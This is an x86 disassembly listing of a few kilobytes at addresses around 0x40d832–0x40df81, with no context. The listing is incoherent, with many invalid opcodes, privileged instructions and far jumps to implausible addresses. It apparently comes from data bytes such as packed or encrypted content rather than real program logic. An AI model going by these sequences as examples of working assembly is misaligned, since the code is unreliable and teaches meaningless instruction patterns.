  40d832:	sbb    al,0x3e
  40d834:	int    0x18
  40d836:	or     dl,BYTE PTR [ebx+0x3c]
  40d839:	js     0x40d833
  40d83b:	and    esp,edx
  40d83d:	mov    ebp,0x3604973d
  40d842:	sbb    BYTE PTR [eax+0x5c],dl
  40d845:	push   edi
  40d846:	pop    ds
  40d847:	inc    ebx
  40d848:	lds    esp,FWORD PTR [edi-0x58]
  40d84b:	pop    eax
  40d84c:	call   0x3f3b65be
  40d851:	ficomp WORD PTR [ecx]
  40d853:	cmp    esi,DWORD PTR [ebp-0x23]
  40d856:	dec    sp
  40d858:	aam    0x92
  40d85a:	add    eax,0x98b889ff
  40d85f:	leave  
  40d860:	add    eax,0xf4c94fb4
  40d865:	inc    ecx
  40d866:	inc    edi
  40d867:	push   0x2e
  40d869:	push   ds
  40d86a:	rol    ecx,cl
  40d86c:	jmp    0x40d8d6
  40d86e:	pop    ds
  40d86f:	inc    ecx
  40d870:	addr16 cld 
  40d872:	xor    esi,DWORD PTR [edx-0x28]
  40d875:	push   ds
  40d876:	sbb    BYTE PTR [ecx],cl
  40d878:	xor    eax,0xb2350d9e
  40d87d:	aaa    
  40d87e:	sti    
  40d87f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d880:	shl    BYTE PTR [ecx+0x1d],1
  40d883:	(bad)  
  40d884:	fwait
  40d885:	int3   
  40d886:	push   ss
  40d887:	outs   dx,BYTE PTR ds:[esi]
  40d888:	aad    0xc0
  40d88a:	push   cs
  40d88b:	add    eax,0xefe7699d
  40d890:	jb     0x40d876
  40d892:	in     al,0x1
  40d894:	mov    eax,ds:0xf873ecdf
  40d899:	or     DWORD PTR [eax],0x48
  40d89c:	jbe    0x40d891
  40d89e:	aas    
  40d89f:	cli    
  40d8a0:	test   DWORD PTR [ebp+0x6dfb11b5],edx
  40d8a6:	mov    BYTE PTR [esp+esi*2+0x7d4946f3],bh
  40d8ad:	iret   
  40d8ae:	call   0xad8b:0x8a4352b8
  40d8b5:	call   0xa210530d
  40d8ba:	(bad)  
  40d8bb:	out    dx,al
  40d8bc:	jle    0x40d91d
  40d8be:	dec    ebp
  40d8bf:	adc    eax,0x8598875
  40d8c4:	aam    0x24
  40d8c6:	cmp    DWORD PTR [ebp+0x71],esi
  40d8c9:	adc    DWORD PTR [ebx+edi*4-0x78],ebx
  40d8cd:	mov    BYTE PTR [edi+0x193dbcba],cl
  40d8d3:	sbb    dl,ah
  40d8d5:	jp     0x40d916
  40d8d7:	mov    dl,BYTE PTR [ecx+ebp*8+0x6a]
  40d8db:	mov    BYTE PTR [eax-0x66],bl
  40d8de:	addr16 sti 
  40d8e0:	mov    edx,0xef732b9d
  40d8e5:	xchg   edi,eax
  40d8e6:	jne    0x40d872
  40d8e8:	mov    ebx,0xa81e914d
  40d8ed:	int    0x51
  40d8ef:	mov    WORD PTR [esi-0x10],ds
  40d8f2:	fdivp  st(3),st
  40d8f4:	inc    ecx
  40d8f5:	xchg   edx,eax
  40d8f6:	add    al,0xb4
  40d8f8:	add    eax,0x367aa366
  40d8fd:	outs   dx,DWORD PTR ds:[esi]
  40d8fe:	sbb    al,0x71
  40d900:	jp     0x40d8db
  40d902:	jbe    0x40d953
  40d904:	clc    
  40d905:	minps  xmm6,XMMWORD PTR [esp+ebp*4+0x2]
  40d90a:	dec    edx
  40d90b:	mov    dh,0xa3
  40d90d:	outs   dx,BYTE PTR ds:[esi]
  40d90e:	cs inc eax
  40d910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d911:	lahf   
  40d912:	cs adc eax,0x8c963467
  40d918:	jle    0x40d8de
  40d91a:	xchg   esp,eax
  40d91b:	adc    edi,eax
  40d91d:	aas    
  40d91e:	xchg   ebp,eax
  40d91f:	in     eax,dx
  40d920:	popa   
  40d921:	in     al,dx
  40d922:	mov    eax,0x69f6a4f
  40d927:	shr    DWORD PTR [eax+0x9],1
  40d92a:	pop    ecx
  40d92b:	hlt    
  40d92c:	mov    ecx,0x57eaba86
  40d931:	es push es
  40d933:	dec    ebp
  40d934:	loopne 0x40d979
  40d936:	arpl   bp,cx
  40d938:	xor    eax,0x9b62f04d
  40d93d:	mov    cl,BYTE PTR [edi]
  40d93f:	xchg   cl,dh
  40d941:	sbb    cl,BYTE PTR [ebx+0x49]
  40d944:	sti    
  40d945:	cld    
  40d946:	and    al,0x55
  40d948:	(bad)  
  40d949:	aas    
  40d94a:	shl    BYTE PTR [ebp+0x5],1
  40d94d:	jmp    DWORD PTR [edx-0x25]
  40d950:	add    ecx,ecx
  40d952:	inc    esi
  40d953:	outs   dx,DWORD PTR ds:[esi]
  40d954:	jb     0x40d91c
  40d956:	(bad)  
  40d957:	and    dh,ch
  40d959:	repnz arpl WORD PTR [edx-0xf],sp
  40d95d:	mov    BYTE PTR [edx-0xe192e02],ch
  40d963:	mul    DWORD PTR [esi+ebp*2+0x27]
  40d967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d968:	sbb    al,0x1a
  40d96a:	inc    ecx
  40d96b:	scas   eax,DWORD PTR es:[edi]
  40d96c:	in     eax,dx
  40d96d:	inc    edi
  40d96e:	test   eax,0x62ecc9b8
  40d973:	mov    ch,0xe0
  40d975:	cmp    ch,0x60
  40d978:	push   0x3ad799fb
  40d97d:	sar    bl,cl
  40d97f:	jnp    0x40d981
  40d981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d983:	or     esi,DWORD PTR [ebx]
  40d985:	ins    DWORD PTR es:[edi],dx
  40d986:	cld    
  40d987:	mov    eax,0x1bdf279a
  40d98c:	xchg   BYTE PTR [eax-0x533b0562],dh
  40d992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d993:	jb     0x40d95a
  40d995:	mov    ecx,0x78a72d6d
  40d99a:	push   ebp
  40d99b:	or     eax,0xd48369ef
  40d9a0:	push   esp
  40d9a1:	pop    ecx
  40d9a2:	cmp    DWORD PTR [ecx-0x46],edx
  40d9a5:	jae    0x40da16
  40d9a7:	lods   eax,DWORD PTR ds:[esi]
  40d9a8:	cdq    
  40d9a9:	outs   dx,BYTE PTR ds:[esi]
  40d9aa:	sbb    dh,BYTE PTR [edx+0x76]
  40d9ad:	adc    DWORD PTR ds:0x52fdc341,0x5df0850a
  40d9b7:	in     al,dx
  40d9b8:	add    dh,ah
  40d9ba:	fidivr DWORD PTR [ecx]
  40d9bc:	imul   ebp,DWORD PTR [edi],0x1e
  40d9bf:	ror    BYTE PTR [ebx+0x631635cd],1
  40d9c5:	pop    edi
  40d9c6:	call   0x1255f3c7
  40d9cb:	jg     0x40d9ce
  40d9cd:	jb     0x40da0c
  40d9cf:	sti    
  40d9d0:	sbb    eax,0x9a1fd9ed
  40d9d5:	sahf   
  40d9d6:	sbb    al,0x3e
  40d9d8:	mov    ?,WORD PTR [ecx]
  40d9da:	out    0x6e,al
  40d9dc:	xchg   cl,bh
  40d9de:	jb     0x40d984
  40d9e0:	xor    DWORD PTR [ebp+0x3e],ecx
  40d9e3:	sub    esi,0xfffffffe
  40d9e6:	push   ebx
  40d9e7:	ret    0xe260
  40d9ea:	push   ss
  40d9eb:	xor    eax,0x3d804664
  40d9f0:	clc    
  40d9f1:	pop    ebp
  40d9f2:	adc    BYTE PTR [ecx+0x78],ah
  40d9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f6:	pop    esi
  40d9f7:	or     al,0x9b
  40d9f9:	rcr    BYTE PTR [edi],1
  40d9fb:	mov    ebp,0x9a939158
  40da00:	in     al,0x81
  40da02:	lahf   
  40da03:	xlat   BYTE PTR ds:[ebx]
  40da04:	mov    ds:0x3daacabd,eax
  40da09:	popa   
  40da0a:	mov    dh,BYTE PTR [esp+edx*8]
  40da0d:	shl    BYTE PTR [eax-0x6b9b830],cl
  40da13:	jle    0x40d9c5
  40da15:	enter  0xbf7b,0x96
  40da19:	push   ds
  40da1a:	or     esp,esi
  40da1c:	lea    eax,[eax-0x8]
  40da1f:	imul   BYTE PTR [ebx+0x53ae4e53]
  40da25:	or     DWORD PTR [eax],ebx
  40da27:	jg     0x40d9fd
  40da29:	aad    0xb4
  40da2b:	fist   DWORD PTR [ebp+edx*1-0x68e92083]
  40da32:	sbb    bl,ah
  40da34:	gs jae 0x40d9b8
  40da37:	pop    ecx
  40da38:	pushf  
  40da39:	adc    dh,BYTE PTR [edi+ebx*8+0x17a71d92]
  40da40:	pop    edx
  40da41:	gs pop esi
  40da43:	or     eax,0xd080414a
  40da48:	in     eax,0xe7
  40da4a:	mov    bh,bl
  40da4c:	test   BYTE PTR ds:0x23c6e086,cl
  40da52:	es add ch,bl
  40da55:	pop    eax
  40da56:	clc    
  40da57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da58:	les    edx,FWORD PTR [edi*8-0x6a293dee]
  40da5f:	pop    eax
  40da60:	xlat   BYTE PTR ds:[ebx]
  40da61:	cli    
  40da62:	cmp    al,0x15
  40da64:	or     eax,0x38a6cc1d
  40da69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da6a:	pop    esp
  40da6b:	inc    DWORD PTR ds:0xe2c6b1b7
  40da71:	inc    ecx
  40da72:	mov    ebp,0x666f26f8
  40da77:	cwde   
  40da78:	push   eax
  40da79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da7a:	cmp    BYTE PTR [edx],al
  40da7c:	test   eax,0x4eb61f7d
  40da81:	pop    esi
  40da82:	sti    
  40da83:	add    al,0x7c
  40da85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da86:	jl     0x40da0a
  40da88:	and    ch,BYTE PTR [ebp+0x29]
  40da8b:	cmp    edx,DWORD PTR [ebp+0x55]
  40da8e:	test   al,0xc8
  40da90:	invd   
  40da92:	sbb    eax,esp
  40da94:	ss loop 0x40dae8
  40da97:	dec    eax
  40da98:	ins    BYTE PTR es:[edi],dx
  40da99:	in     al,dx
  40da9a:	or     BYTE PTR [eax-0xd],bh
  40da9d:	jnp    0x40db10
  40da9f:	lods   al,BYTE PTR gs:[esi]
  40daa1:	repz pop edi
  40daa3:	push   0x3f102904
  40daa8:	and    DWORD PTR [ecx],edi
  40daaa:	jle    0x40daf5
  40daac:	mov    ebp,0x7c496165
  40dab1:	add    al,0x14
  40dab3:	(bad)  
  40dab4:	jmp    0x475936bc
  40dab9:	xchg   BYTE PTR [eax-0xd38dda1],cl
  40dabf:	jno    0x40db05
  40dac1:	adc    ecx,DWORD PTR fs:[edi+0x195aa87e]
  40dac8:	sbb    bl,BYTE PTR [ecx+edi*2-0x7f4ec5d2]
  40dacf:	xchg   DWORD PTR [edx+0x5ac5bf28],edi
  40dad5:	mov    ch,0x95
  40dad7:	inc    ebx
  40dad8:	int3   
  40dad9:	jae    0x40dac6
  40dadb:	fsubr  QWORD PTR [ebp-0x4b]
  40dade:	add    BYTE PTR [ecx+0x7f],bh
  40dae1:	pop    ss
  40dae2:	es cmp edi,ecx
  40dae5:	jp     0x40da68
  40dae7:	and    eax,0xdd1ace85
  40daec:	int    0x2b
  40daee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daef:	xor    edx,DWORD PTR [edx+0x4e]
  40daf2:	cwde   
  40daf3:	jg     0x40db21
  40daf5:	push   ebx
  40daf6:	ds cmp eax,0x86239c02
  40dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dafd:	shr    dh,cl
  40daff:	inc    ebx
  40db00:	mov    ebp,0xdd6e263e
  40db05:	std    
  40db06:	stc    
  40db07:	xchg   esp,eax
  40db08:	push   0x7c6a898e
  40db0d:	adc    ebp,edx
  40db0f:	(bad)  
  40db10:	jp     0x40dae5
  40db12:	stc    
  40db13:	test   eax,0x4ddee661
  40db18:	jae    0x40dafa
  40db1a:	fnclex 
  40db1c:	mov    bl,BYTE PTR [esi-0x25]
  40db1f:	imul   DWORD PTR [esi]
  40db21:	push   0x6096972c
  40db26:	out    0xc9,al
  40db28:	int    0x5
  40db2a:	pop    esp
  40db2b:	inc    esi
  40db2c:	add    ch,cl
  40db2e:	(bad)  
  40db31:	or     DWORD PTR [edx-0x320b61c1],ecx
  40db37:	lock mov DWORD PTR [eax-0x1d314b71],edi
  40db3e:	jge    0x40dad5
  40db40:	adc    BYTE PTR [ebx],ch
  40db42:	bound  ecx,QWORD PTR [esi-0x2e]
  40db45:	lahf   
  40db46:	mov    bl,0x87
  40db48:	retf   
  40db49:	inc    edx
  40db4a:	cli    
  40db4b:	or     ecx,DWORD PTR [edx-0x715d4002]
  40db51:	sub    al,0xcd
  40db53:	adc    dh,al
  40db55:	push   ebx
  40db56:	jnp    0x40db5c
  40db58:	sub    DWORD PTR [edi+0x26],esi
  40db5b:	adc    al,0x5
  40db5d:	or     ah,dl
  40db5f:	(bad)  
  40db60:	fwait
  40db61:	int    0xfd
  40db63:	xchg   ecx,eax
  40db64:	dec    edi
  40db65:	mov    esi,0x8c4f32f6
  40db6b:	mov    dl,0xf4
  40db6d:	call   0x4b5c:0xf1394b
  40db74:	xchg   esp,eax
  40db75:	pop    ds
  40db76:	or     al,0x73
  40db78:	in     al,dx
  40db79:	or     esi,DWORD PTR [eax]
  40db7b:	pop    ds
  40db7c:	sub    al,0x57
  40db7e:	xchg   ecx,eax
  40db7f:	mov    al,ds:0xf64b96fb
  40db84:	data16 stos BYTE PTR es:[edi],al
  40db86:	rcr    DWORD PTR [ecx],1
  40db88:	and    bl,BYTE PTR [ebx+esi*4]
  40db8b:	jo     0x40db56
  40db8d:	push   ss
  40db8e:	sub    DWORD PTR [ebx+eax*4+0x48664f8f],0xa775a645
  40db99:	push   0x49a592d6
  40db9e:	xchg   ebx,eax
  40db9f:	or     ecx,DWORD PTR [ebx+0x134b509a]
  40dba5:	dec    ebp
  40dba6:	clc    
  40dba7:	mov    ebx,0x17b68668
  40dbac:	adc    BYTE PTR [eax+0x23],bl
  40dbaf:	mov    DWORD PTR [ebx],0xf92a053e
  40dbb5:	fisttp QWORD PTR [edx]
  40dbb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb8:	jl     0x40db49
  40dbba:	xchg   ebp,eax
  40dbbb:	mov    DWORD PTR [ecx+0x71],ebx
  40dbbe:	xchg   ecx,eax
  40dbbf:	ins    DWORD PTR es:[edi],dx
  40dbc0:	dec    edx
  40dbc1:	jge    0x40db7e
  40dbc3:	cmp    dh,BYTE PTR [edx]
  40dbc5:	daa    
  40dbc6:	sti    
  40dbc7:	and    eax,DWORD PTR ss:[ecx-0x11]
  40dbcb:	std    
  40dbcc:	test   eax,0xad16df34
  40dbd1:	dec    esp
  40dbd2:	pop    edi
  40dbd3:	das    
  40dbd4:	mov    ds:0x7f741c15,al
  40dbd9:	mov    eax,ds:0x3c73741d
  40dbde:	daa    
  40dbdf:	loopne 0x40dbb9
  40dbe1:	(bad)  
  40dbe2:	js     0x40dba8
  40dbe4:	sub    edi,DWORD PTR [ebx+0x5b]
  40dbe7:	xor    BYTE PTR [edx-0x37],0x33
  40dbeb:	push   cs
  40dbec:	test   al,0x25
  40dbee:	sbb    DWORD PTR [ebx-0x40c293cd],esp
  40dbf4:	gs stos DWORD PTR es:[edi],eax
  40dbf6:	(bad)  
  40dbf7:	retf   0x42cf
  40dbfa:	and    eax,0x3ee89589
  40dbff:	push   cs
  40dc00:	and    ch,bl
  40dc02:	lea    esi,[esi-0x2d]
  40dc05:	inc    eax
  40dc06:	inc    BYTE PTR [edx-0x37664ab5]
  40dc0c:	aad    0x81
  40dc0e:	sbb    dl,dh
  40dc10:	es out dx,al
  40dc12:	xor    eax,0x91d47ace
  40dc17:	xchg   ecx,eax
  40dc18:	fist   DWORD PTR [edx]
  40dc1a:	ffree  st(7)
  40dc1c:	jns    0x40dc55
  40dc1e:	shl    BYTE PTR [eax-0x14a28b63],1
  40dc24:	push   ebp
  40dc25:	ins    BYTE PTR es:[edi],dx
  40dc26:	and    dh,BYTE PTR [ebx+0x75]
  40dc29:	inc    eax
  40dc2a:	pop    esi
  40dc2b:	add    DWORD PTR [edi+0x7],0x2c0fe196
  40dc32:	pop    ebx
  40dc33:	frstor [ecx]
  40dc35:	test   al,0xf8
  40dc37:	(bad)  
  40dc38:	mov    esp,DWORD PTR ds:0x4edd0047
  40dc3e:	and    eax,0x16
  40dc41:	pop    ebx
  40dc42:	js     0x40dbd1
  40dc44:	int3   
  40dc45:	xchg   ebp,eax
  40dc46:	push   cs
  40dc47:	ret    
  40dc48:	sub    al,0x95
  40dc4a:	in     al,0xf2
  40dc4c:	test   BYTE PTR [ebp+0x49],0xc7
  40dc50:	or     dh,cl
  40dc52:	jb     0x40dc67
  40dc54:	add    DWORD PTR ds:0x5ed38f9f,ebp
  40dc5a:	or     BYTE PTR [ecx+eiz*8-0x4e4135be],bl
  40dc61:	(bad)  
  40dc62:	fsubr  QWORD PTR [ebx+0x65]
  40dc65:	mov    ds:0x625d77a9,eax
  40dc6a:	push   edi
  40dc6b:	dec    edi
  40dc6c:	jbe    0x40dc8a
  40dc6e:	mov    al,ds:0xceaab603
  40dc73:	push   eax
  40dc74:	(bad)  
  40dc75:	mov    ebx,DWORD PTR [ebx-0x66]
  40dc78:	xchg   esp,eax
  40dc79:	cmp    eax,0x6e265717
  40dc7e:	out    0x47,eax
  40dc80:	es adc al,0x46
  40dc83:	sar    DWORD PTR [esi+0x5d],cl
  40dc86:	mov    bl,0x50
  40dc88:	mov    cl,0xd2
  40dc8a:	mov    ds:0x50bfdda6,eax
  40dc8f:	call   0x2f89432f
  40dc94:	sub    al,0xc4
  40dc96:	call   0x1d2f8f5
  40dc9b:	jmp    0x59f89a1d
  40dca0:	jns    0x40dc8a
  40dca2:	pop    esi
  40dca3:	or     BYTE PTR [ebp-0x79],al
  40dca6:	data16 int3 
  40dca8:	fisub  DWORD PTR ss:[edi+0x7e]
  40dcac:	ja     0x40dc3c
  40dcae:	ins    BYTE PTR es:[edi],dx
  40dcaf:	out    0x1,al
  40dcb1:	stos   BYTE PTR es:[edi],al
  40dcb2:	cli    
  40dcb3:	out    0x68,al
  40dcb5:	loop   0x40dd0d
  40dcb7:	sub    ebx,edi
  40dcb9:	sbb    DWORD PTR [ebp+0x38],esi
  40dcbc:	sysexit 
  40dcbe:	mov    al,ds:0x31c3d1e5
  40dcc3:	mul    dl
  40dcc5:	xor    eax,0xff759ca9
  40dcca:	mov    ebp,0x35b5aed4
  40dccf:	(bad)  
  40dcd0:	sahf   
  40dcd1:	loope  0x40dc5e
  40dcd3:	setle  BYTE PTR [eax+0x49]
  40dcd7:	adc    DWORD PTR [ebx-0x24a55f53],eax
  40dcdd:	push   eax
  40dcde:	push   eax
  40dcdf:	outs   dx,DWORD PTR ds:[esi]
  40dce0:	inc    BYTE PTR [edi-0x4108e83e]
  40dce6:	inc    edi
  40dce7:	(bad)  
  40dce8:	iret   
  40dce9:	adc    BYTE PTR [edi+0x7b],dl
  40dcec:	xchg   edx,eax
  40dced:	outs   dx,DWORD PTR ds:[esi]
  40dcee:	mov    esi,0xa29fe152
  40dcf3:	inc    ebx
  40dcf4:	hlt    
  40dcf5:	pop    ds
  40dcf6:	mov    ch,0x14
  40dcf8:	add    ebx,DWORD PTR [ebx-0x7e]
  40dcfb:	xlat   BYTE PTR ds:[ebx]
  40dcfc:	and    dh,BYTE PTR [esi+0x79]
  40dcff:	in     al,dx
  40dd00:	adc    al,dh
  40dd02:	xor    BYTE PTR [edx],bl
  40dd04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd05:	test   dh,al
  40dd07:	sbb    al,0x7b
  40dd09:	iret   
  40dd0a:	xor    eax,0xcbab8101
  40dd0f:	cld    
  40dd10:	rcr    dl,0xe8
  40dd13:	adc    eax,0xdaccd0c2
  40dd18:	popf   
  40dd19:	jl     0x40dd74
  40dd1b:	xor    ebp,DWORD PTR [ecx+0x20]
  40dd1e:	adc    BYTE PTR [esi+0x78],ch
  40dd21:	mov    ah,0xc1
  40dd23:	mov    ebx,DWORD PTR [ebx]
  40dd25:	clc    
  40dd26:	dec    ebp
  40dd27:	fsubrp st(3),st
  40dd29:	clc    
  40dd2a:	test   BYTE PTR [ebx-0x442c69dc],bl
  40dd30:	mov    bh,0xbf
  40dd32:	adc    bh,ch
  40dd34:	jo     0x40dd3a
  40dd36:	mov    ecx,0x18cc2021
  40dd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd3c:	push   esi
  40dd3d:	stos   BYTE PTR es:[edi],al
  40dd3e:	sub    al,cl
  40dd40:	xlat   BYTE PTR ds:[ebx]
  40dd41:	(bad)  
  40dd42:	add    DWORD PTR cs:[esi+0x65cd7b3e],0x181c3100
  40dd4d:	pop    esp
  40dd4e:	pop    ebp
  40dd4f:	push   esp
  40dd50:	scas   eax,DWORD PTR es:[edi]
  40dd51:	in     eax,0xd3
  40dd53:	ret    
  40dd54:	in     al,dx
  40dd55:	lea    edx,[ecx+0x193d1229]
  40dd5b:	popa   
  40dd5c:	or     DWORD PTR [esi-0x49dfd77e],ecx
  40dd62:	push   esp
  40dd63:	in     eax,0x99
  40dd65:	call   0x8ca455e9
  40dd6a:	jl     0x40dd07
  40dd6c:	xor    ebp,DWORD PTR [ecx]
  40dd6e:	hlt    
  40dd6f:	je     0x40dd76
  40dd71:	and    ebp,DWORD PTR [edi]
  40dd73:	push   es
  40dd74:	mov    esi,0x95f713d1
  40dd79:	inc    ecx
  40dd7a:	xchg   esi,eax
  40dd7b:	sbb    eax,0xe4a0037f
  40dd80:	sub    bl,BYTE PTR ds:0x9f6b1551
  40dd86:	mov    esi,0xdaa5664e
  40dd8b:	jae    0x40dd19
  40dd8d:	lds    esi,FWORD PTR [ebp-0x3b]
  40dd90:	push   eax
  40dd91:	je     0x40dd92
  40dd93:	push   ecx
  40dd94:	add    BYTE PTR [esi+0x68],al
  40dd97:	jmp    DWORD PTR [ebx+0x4b]
  40dd9a:	pop    edx
  40dd9b:	test   eax,0x1ac9cba9
  40dda0:	jmp    0x5a290ec2
  40dda5:	wrmsr  
  40dda7:	adc    al,0x89
  40dda9:	(bad)  
  40ddab:	sub    eax,0x6f1aaecd
  40ddb0:	inc    edx
  40ddb1:	shl    DWORD PTR [eax],cl
  40ddb3:	add    DWORD PTR [edi],ecx
  40ddb5:	cmp    dh,dh
  40ddb7:	loop   0x40ddaf
  40ddb9:	lock nop
  40ddbb:	rol    BYTE PTR [ebp-0x2a],cl
  40ddbe:	mul    dh
  40ddc0:	aam    0xeb
  40ddc2:	arpl   bx,di
  40ddc4:	jmp    0x4996:0xdc53fe3d
  40ddcb:	push   0xfffb0a08
  40ddd0:	push   ebx
  40ddd1:	dec    esi
  40ddd2:	mov    ebx,0xc9e40eec
  40ddd7:	lahf   
  40ddd8:	mov    ds:0x3698ed94,al
  40dddd:	and    BYTE PTR [ecx-0x4d],bh
  40dde0:	lock popf 
  40dde2:	aaa    
  40dde3:	or     dh,BYTE PTR [esi+0x39def992]
  40dde9:	jae    0x40ddb0
  40ddeb:	xchg   edi,eax
  40ddec:	lds    eax,FWORD PTR [ecx]
  40ddee:	gs push eax
  40ddf0:	cli    
  40ddf1:	dec    ebp
  40ddf2:	push   esi
  40ddf3:	leave  
  40ddf4:	pop    ecx
  40ddf5:	xor    BYTE PTR [esi-0x32],cl
  40ddf8:	cmp    al,0x19
  40ddfa:	or     ebp,DWORD PTR [eax-0x4c]
  40ddfd:	rcr    BYTE PTR [ebx+0x2d8b9175],1
  40de03:	fist   DWORD PTR [edx-0x3b]
  40de06:	dec    esi
  40de07:	ficomp DWORD PTR [ecx]
  40de09:	fadd   QWORD PTR [esi+0x5305dad5]
  40de0f:	or     eax,0xcdb99bfa
  40de14:	(bad)  
  40de15:	aad    0xe
  40de17:	sahf   
  40de18:	(bad)  
  40de19:	jno    0x40de80
  40de1b:	mov    esp,0xcd0ae1ca
  40de20:	ret    
  40de21:	mov    cl,0xa6
  40de23:	cdq    
  40de24:	mov    cl,0x2b
  40de26:	cmp    esp,ebp
  40de28:	pop    eax
  40de29:	jns    0x40de9b
  40de2b:	push   es
  40de2c:	lods   al,BYTE PTR ds:[esi]
  40de2d:	dec    esi
  40de2e:	sbb    ebp,DWORD PTR [edi]
  40de30:	xor    al,0xd6
  40de32:	repz sub BYTE PTR [edi],ch
  40de35:	and    al,0xb
  40de37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de38:	or     eax,0xc0d55380
  40de3d:	mov    al,ds:0x46f07171
  40de42:	inc    esp
  40de43:	fisubr WORD PTR [ebx-0x1e269dce]
  40de49:	push   ds
  40de4a:	jae    0x40debc
  40de4c:	aas    
  40de4d:	xor    BYTE PTR cs:[eax+0x50cafc81],ah
  40de54:	test   al,0xc0
  40de56:	in     al,dx
  40de57:	call   0x16d4:0x46e922fc
  40de5e:	aad    0xc4
  40de60:	lods   eax,DWORD PTR ds:[esi]
  40de61:	fdivr  DWORD PTR [edi+0x28]
  40de64:	xor    eax,0x8902a72e
  40de69:	test   BYTE PTR [ebp+0x5d],dl
  40de6c:	rcl    ah,0xf0
  40de6f:	sbb    al,0x84
  40de71:	pop    edi
  40de72:	xchg   esp,eax
  40de73:	mov    ebp,0x37f21641
  40de78:	xor    dh,BYTE PTR ds:0x56e29c71
  40de7e:	jle    0x40de5f
  40de80:	outs   dx,BYTE PTR ds:[esi]
  40de81:	repnz pop eax
  40de83:	aas    
  40de84:	adc    DWORD PTR [edx],ecx
  40de86:	std    
  40de87:	enter  0xf4e5,0xc
  40de8b:	lods   eax,DWORD PTR ds:[esi]
  40de8c:	sbb    esi,DWORD PTR [edi-0x1036d17f]
  40de92:	lock cmp DWORD PTR [ebp-0x73],0xcf7338c8
  40de9a:	out    dx,al
  40de9b:	or     DWORD PTR [esi],ebx
  40de9d:	and    BYTE PTR [esi+0xa831116],al
  40dea3:	sbb    DWORD PTR [esi+0x70],eax
  40dea6:	jle    0x40df06
  40dea8:	icebp  
  40dea9:	inc    ecx
  40deaa:	xlat   BYTE PTR ds:[ebx]
  40deab:	in     al,0xc8
  40dead:	fucomi st,st(6)
  40deaf:	push   ss
  40deb0:	mov    al,0xed
  40deb2:	dec    esp
  40deb3:	lods   al,BYTE PTR ds:[esi]
  40deb4:	dec    ebp
  40deb5:	mov    dh,0x30
  40deb7:	cmp    DWORD PTR [ecx+esi*1-0x35],0xffffff8e
  40debc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40debd:	and    BYTE PTR [edx+0x335618f7],al
  40dec3:	inc    ebx
  40dec4:	mov    eax,ss:0x7251688e
  40deca:	pusha  
  40decb:	sbb    eax,0xb7d479db
  40ded0:	ret    
  40ded1:	sbb    esp,DWORD PTR [ebp+0x7e4e7cae]
  40ded7:	cmp    ebx,ebx
  40ded9:	lds    ebp,FWORD PTR [eax]
  40dedb:	or     dh,BYTE PTR [ebx]
  40dedd:	xchg   edx,eax
  40dede:	push   es
  40dedf:	pusha  
  40dee0:	ins    DWORD PTR es:[edi],dx
  40dee1:	out    0x5f,eax
  40dee3:	arpl   WORD PTR [eax-0x17],bx
  40dee6:	add    edx,DWORD PTR [esi]
  40dee8:	in     eax,dx
  40dee9:	lock stos BYTE PTR es:[edi],al
  40deeb:	out    0x52,al
  40deed:	mov    al,0x48
  40deef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40def0:	bound  ecx,QWORD PTR [ebp-0x40]
  40def3:	(bad)  
  40def5:	mov    ch,bh
  40def7:	pop    ebp
  40def8:	mov    ebx,0x353c8fca
  40defd:	push   cs
  40defe:	jp     0x40df60
  40df00:	push   es
  40df01:	and    dl,BYTE PTR [eax]
  40df03:	scas   eax,DWORD PTR es:[edi]
  40df04:	mov    al,0x55
  40df06:	ja     0x40df09
  40df08:	push   ss
  40df09:	jb     0x40de9b
  40df0b:	xchg   edi,eax
  40df0c:	int3   
  40df0d:	call   0xcbc6fc11
  40df12:	adc    DWORD PTR [esp+eiz*8],eax
  40df15:	clc    
  40df16:	push   ebp
  40df17:	sub    DWORD PTR [edx+0x77],ebp
  40df1a:	jno    0x40df58
  40df1c:	imul   esi,DWORD PTR [esi+0x3e],0x3b29fbaf
  40df23:	pop    ebp
  40df24:	mov    bl,BYTE PTR [edx+0x7d5d708b]
  40df2a:	mov    esp,0xfb6b9feb
  40df2f:	fsub   st,st(0)
  40df31:	stos   BYTE PTR es:[edi],al
  40df32:	cwde   
  40df33:	jp     0x40df69
  40df35:	mov    edi,DWORD PTR [ebx+eiz*8-0xe4a38a]
  40df3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df3d:	pop    ecx
  40df3e:	mov    esi,0xd3574ebb
  40df43:	add    ebp,eax
  40df45:	or     DWORD PTR [eax-0x5b9ef807],esi
  40df4b:	or     dh,BYTE PTR [ebp-0x256c88e9]
  40df51:	mov    ds,ecx
  40df53:	les    eax,FWORD PTR [edx]
  40df55:	test   BYTE PTR [eax-0x5be5eb6f],ah
  40df5b:	nop
  40df5c:	adc    edi,ebx
  40df5e:	stos   BYTE PTR es:[edi],al
  40df5f:	and    al,0xa5
  40df61:	repnz retf 
  40df63:	xor    DWORD PTR [esi],edi
  40df65:	repz lea edx,[esi-0xa35ded1]
  40df6c:	outs   dx,BYTE PTR ds:[esi]
  40df6d:	das    
  40df6e:	or     DWORD PTR [ebx],ecx
  40df70:	shl    DWORD PTR [eax+edi*1-0x680eef48],0xb4
  40df78:	out    0xda,al
  40df7a:	jno    0x40df6a
  40df7c:	push   edx
  40df7d:	mov    bh,0x5a
  40df7f:	(bad)  
  40df80:	fwait
  40df81:	inc    esi
